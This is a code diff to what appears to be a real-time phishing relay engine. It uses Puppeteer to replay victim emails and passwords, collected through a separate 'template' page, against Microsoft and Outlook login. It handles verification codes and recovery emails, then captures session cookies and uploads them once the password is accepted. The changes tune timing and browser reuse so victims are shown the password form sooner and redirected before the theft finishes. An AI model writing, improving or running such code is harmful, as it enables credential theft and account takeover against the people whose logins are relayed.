@@ -133,7 +133,7 @@ async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false)
     // 2. Only do full Sheets cascade for terminal states (COMPLETED/FAILED).
     //    Intermediate writes go through cache + batched background sync to conserve quota.
     const status = updateData.status || '';
-    if (status === 'COMPLETED' || status === 'FAILED' || status === 'PROCESSING_FINALIZING') {
+    if (status === 'COMPLETED' || status === 'FAILED') {
         const cachedForWrite = getCachedRow(browserId) || {};
         const mergedForWrite = { ...cachedForWrite, ...updateData };
         await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
@@ -770,11 +770,12 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     }
 
                     await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
-                    await new Promise(res => setTimeout(res, 3000));
 
                     // Immediately set WAITINGPASSWORD so template shows password form
                     // while engine navigates intermediate views / solves CAPTCHAs
                     if (browserId) {
+                        _timer.waitingPasswordSet = Date.now();
+                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set. elapsed: ${_timer.waitingPasswordSet - _timer.start}ms`);
                         updateBrowserRowDataFast(browserId, {
                             status: "WAITINGPASSWORD",
                             email: email || '',
@@ -782,6 +783,9 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                             fullAccess: false
                         });
                     }
+
+                    // Brief settle delay before checking page state
+                    await new Promise(res => setTimeout(res, 1000));
 
                     // Wait for the page to actually transition (SPA) — look for either "Verify your email" or password input
                     const transitionSelectors = ["[data-testid='title']", "input[name='passwd']", "input[type='password']", "#proof-confirmation-email-input", "h1"];
@@ -1169,6 +1173,18 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         };
                     }
 
+                    // If no verification screen, immediately set WAITINGPASSWORD after email submission
+                    // so template shows password form while engine navigates intermediate views
+                    if (step.selector === 'nextButton' && !password && browserId) {
+                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (flow-based, before additional views).`);
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGPASSWORD",
+                            email: email || '',
+                            verified: false,
+                            fullAccess: false
+                        });
+                    }
+
                     // If no verification screen, then handle general additional views
                     await handleAdditionalViews(page, platformConfig, instanceId);
                 }
@@ -1430,6 +1446,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             initialRowData.password = cachedBeforePopulate.password;
         }
     }
+    // Merge cached password (written by update-process before async sheet flush) into local variable
+    if (cachedBeforePopulate?.password) {
+        password = cachedBeforePopulate.password;
+        initialRowData.password = password;
+    }
     populateCache(browserId, initialRowData);
 
     // Use effective status from cache (preserved across HMR) over stale sheet value
@@ -1483,6 +1504,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
 
         if (!browser) { // Only launch new browser if not reusing a valid one
+            // Check if there's already an active browser session (stored right after launch).
+            // If so, reuse it instead of killing and relaunching (prevents wake-up from destroying
+            // the first processRow's in-flight browser).
+            const existingBrowserSession = activeBrowserSessions.get(browserId);
+            if (existingBrowserSession?.browser?.isConnected()) {
+                logger.info(`[processRow][${browserId}] Active browser session found (PID: ${existingBrowserSession.browser.process()?.pid}). Reusing existing browser instead of launching new one.`);
+                browser = existingBrowserSession.browser;
+                page = existingBrowserSession.page;
+                const session = activeBrowserSessions.get(browserId);
+                targetCreatedListener = session?.targetCreatedListener;
+                if (targetCreatedListener) {
+                    browser.on('targetcreated', targetCreatedListener);
+                }
+                isReusingBrowser = true;
+                instanceId = `PROC-REUSE-${browserId}-${browser.process()?.pid || 'unknownPID'}`;
+                try { await page.bringToFront(); } catch (e) { logger.warn(`[processRow][${browserId}] Error bringing reused page to front: ${e.message}`); }
+                // Skip stale killing and launch — use the existing browser
+            } else {
             // Kill any stale Chrome process holding the same userDataDir lock
             // (happens when HMR resets the session map in dev mode)
             if (isDev && userDataDir && browserId && (status.startsWith('WAITING') || status === 'WAITINGEMAILERROR' || status === 'WAITINGPASSWORDERROR')) {
@@ -1592,6 +1631,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             };
             browser.on('targetcreated', targetCreatedListener);
 
+            // Store session immediately after launch so wake-up handler can detect running browser
+            // and skip redundant processRow instead of killing this browser
+            activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener });
+
             await page.setUserAgent(browser.selectedUserAgent);
             await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
 
@@ -1603,6 +1646,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             `;
                 document.head.appendChild(style);
             });
+            } // end else (active browser session reuse)
         }
 
         let domain = '';
@@ -2016,7 +2060,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             }
             updateData.status = finalStatus;
         } else if (status === "WAITINGPASSWORD") {
-            logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
+            _timer.waitingPasswordHandler = Date.now();
+            activelyProcessing.add(browserId);
+            logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state. elapsed since set: ${_timer.waitingPasswordHandler - (_timer.waitingPasswordSet || _timer.start)}ms`);
             let pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
             let passwordProvidedAndProcessed = false;
 
@@ -2083,9 +2129,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     }
 
                     if (cachedPassword && String(cachedPassword).trim() !== "") {
-                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
                         _timer.passwordFound = Date.now();
+                        activelyProcessing.add(browserId);
+                        const waitForPwd = _timer.passwordFound - (_timer.waitingPasswordHandler || _timer.start);
+                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found after ${waitForPwd}ms. Setting status to PROCESSING.`);
                         logger.info(`[engineProcess][${browserId}] +WAITINGPASSWORD (found password)`);
+                        // Sync outer password variable with cachedPassword so alerts (wrong password, etc.) show the actual attempted password
+                        password = cachedPassword;
                         // Restore email from cache if it was cleared (e.g. by STRICTLY_MISMATCH)
                         if (!email) {
                             const cachedRowForEmail = getCachedRow(browserId);
@@ -2126,10 +2176,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Attempting to input password.`);
 
-                        // Ensure page is stable and handle any intermediate views before typing password
-                        // Removed page.waitForLoadState as it's not a function in this Puppeteer version.
-                        await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry'); // New context for password entry specific views
-
                         const passwordInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean);
                         const passwordNextButtonSelector = platformConfig.selectors?.passwordNextButton;
 
@@ -2154,7 +2200,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         const pageTitle = await page.title().catch(() => 'unknown');
                                         logger.debug(`[processRow][${browserId}] Password input not found. URL: ${currentUrl}, Title: ${pageTitle}`);
 
-                                        if (currentUrl === 'about:blank' || (!currentUrl.includes('login.live.com') && !currentUrl.includes('login.microsoftonline.com'))) {
+                                        if (currentUrl === 'about:blank' || currentUrl.includes('oauth20_authorize.srf') || currentUrl.includes('account.live.com') || (!currentUrl.includes('login.live.com') && !currentUrl.includes('login.microsoftonline.com'))) {
                                             logger.info(`[processRow][${browserId}] Page is at ${currentUrl}, navigating to login page for password entry.`);
                                             await page.goto(platformConfig.url || 'https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e => {
                                                 logger.warn(`[processRow][${browserId}] Navigation to login page failed: ${e.message}`);
@@ -2162,8 +2208,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             await new Promise(res => setTimeout(res, 3000));
                                             continue;
                                         }
-
-                                        await handleAdditionalViews(page, platformConfig, instanceId, 'password_entry');
                                         const emailInputSelector = platformConfig.selectors?.input;
                                         if (emailInputSelector) {
                                             const emailVisible = await page.$eval(emailInputSelector, el => el.offsetParent !== null).catch(() => false);
@@ -2416,6 +2460,34 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             viewName: verificationDetails.viewName
                                         };
                                     } else {
+                                        // Password accepted — write PROCESSING_FINALIZING to cache immediately (no Sheets cascade)
+                                        // so template redirects user while engine waits for inbox, captures cookies, and uploads
+                                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password accepted. Sending PROCESSING_FINALIZING to template immediately.`);
+                                        const pfExistingCached = getCachedRow(browserId) || {};
+                                        setCachedRow(browserId, { ...pfExistingCached,
+                                            status: "PROCESSING_FINALIZING",
+                                            email: email || '',
+                                            password: password || '',
+                                            verified: true,
+                                            fullAccess: false,
+                                            lastJsonResponse: JSON.stringify({
+                                                browserId, email, status: "PROCESSING_FINALIZING",
+                                                emailExists: true, accountAccess: true, message: "Password accepted. Finalizing..."
+                                            })
+                                        });
+                                        // If page is stuck on login page after password submit, navigate directly to inbox
+                                        const postPwdUrl = page.url();
+                                        if (postPwdUrl.includes('login.microsoftonline.com') || postPwdUrl.includes('login.live.com')) {
+                                            const emailDomain = email ? email.split('@')[1]?.toLowerCase() : '';
+                                            const directInboxUrl = PLATFORM_INBOX_URLS[emailDomain] || platformConfig.url;
+                                            if (directInboxUrl) {
+                                                logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page still on login page (${postPwdUrl}). Navigating directly to inbox: ${directInboxUrl}`);
+                                                await page.goto(directInboxUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e =>
+                                                    logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Direct navigation to inbox failed: ${e.message}`)
+                                                );
+                                                await new Promise(resolve => setTimeout(resolve, 3000));
+                                            }
+                                        }
                                         let inboxReached = false;
                                         for (let attempt = 0; attempt < 3; attempt++) {
                                             inboxReached = await isInbox(page, platformConfig);
@@ -4282,6 +4354,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         if (_timer.choiceFound) parts.push(`choice=${_timer.choiceFound - _timer.start}ms`);
         if (_timer.recoveryEmailFound) parts.push(`recovery=${_timer.recoveryEmailFound - _timer.start}ms`);
         if (_timer.codeFound) parts.push(`code=${_timer.codeFound - _timer.start}ms`);
+        if (_timer.waitingPasswordSet) parts.push(`waitSet=${_timer.waitingPasswordSet - _timer.start}ms`);
+        if (_timer.waitingPasswordHandler) parts.push(`waitHandler=${_timer.waitingPasswordHandler - _timer.start}ms`);
+        if (_timer.waitingPasswordSet && _timer.waitingPasswordHandler) parts.push(`waitPause=${_timer.waitingPasswordHandler - _timer.waitingPasswordSet}ms`);
         logger.info(`[TIMING][${browserId}] ${parts.join(' | ')}`);
 
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
@@ -4734,11 +4809,40 @@ export async function POST(request) {
 
         // --- Handle requests with browserId (status check or resume) ---
         if (browserId) {
-            // Handle wake-up from AppScript updateProcess
+            // Handle wake-up from AppScript updateProcess — process row immediately
             if (wakeUp) {
+                // Get any existing browser session so processRow can reuse it
+                const existingWakeSession = activeBrowserSessions.get(browserId);
+                if (existingWakeSession?.browser?.isConnected()) {
+                    logger.info(`[POST][${browserId}] Wake-up: reusing existing browser session (PID: ${existingWakeSession.browser.process()?.pid}) for processRow.`);
+                } else {
+                    logger.info(`[POST][${browserId}] Wake-up: no active browser session. Starting fresh processRow.`);
+                }
+                if (activelyProcessing.has(browserId)) {
+                    logger.info(`[POST][${browserId}] Wake-up: processRow already actively processing this browserId. Skipping duplicate.`);
+                    return setCorsHeaders(NextResponse.json({ success: true, message: "Already processing" }, { status: 200 }));
+                }
                 activeProcesses.delete(browserId);
-                ensureIntervalIsRunning();
-                logger.info(`[POST][${browserId}] Wake-up received. Removed from activeProcesses for re-processing.`);
+                activeProcesses.add(browserId); // Re-add immediately to prevent processWaitingRows from picking up the same browserId
+                logger.info(`[POST][${browserId}] Wake-up received. Direct processing started.`);
+                (async () => {
+                    try {
+                        const session = activeBrowserSessions.get(browserId);
+                        const data = await fetchDataFromAppScript(1, 30000, true);
+                        if (!Array.isArray(data) || data.length < 2) return;
+                        const headers = data[0];
+                        const colIndexes = getColumnIndexes(headers);
+                        const row = data.slice(1).find(r => r[colIndexes['browserId']] === browserId);
+                        if (!row) return;
+                        const status = row[colIndexes['status']];
+                        const processable = ["WAITING","WAITINGEMAIL","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"];
+                        if (!processable.includes(status)) return;
+                        activeProcesses.add(browserId);
+                        await processRow(row, colIndexes, session?.browser, session?.page);
+                    } catch (err) {
+                        logger.error(`[POST][${browserId}] Direct processRow error: ${err.message}`);
+                    }
+                })();
                 return setCorsHeaders(NextResponse.json({ success: true, message: "Engine woken up" }, { status: 200 }));
             }
             userDataDir = `/tmp/users_data/${browserId}`; // Set userDataDir early for cleanup
